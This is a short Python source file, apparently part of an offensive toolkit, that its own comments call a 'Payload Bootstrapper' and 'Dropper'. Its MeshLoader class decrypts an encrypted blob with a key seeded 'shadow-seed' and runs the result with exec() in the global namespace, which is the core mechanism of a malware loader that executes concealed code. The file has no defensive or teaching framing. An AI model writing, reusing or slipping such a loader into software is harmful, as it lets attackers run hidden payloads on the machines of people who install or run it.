# mesh_loader.py – Payload Bootstrapper for Mesh Engagement
# mesh_loader.py – Secure Mesh Dropper Bootstrapper

import base64
from crypto.cipher_engine import CipherEngine

class MeshLoader:
    def __init__(self, seed="shadow-seed"):
        self.engine = CipherEngine(seed)

    def inject_code(self, encrypted_blob):
        try:
            decrypted = self.engine.decrypt(encrypted_blob)
            exec(decrypted.decode(), globals())
            print("[✓] Payload executed successfully.")
        except Exception as e:
            print("[✖] Payload execution failed:", str(e))
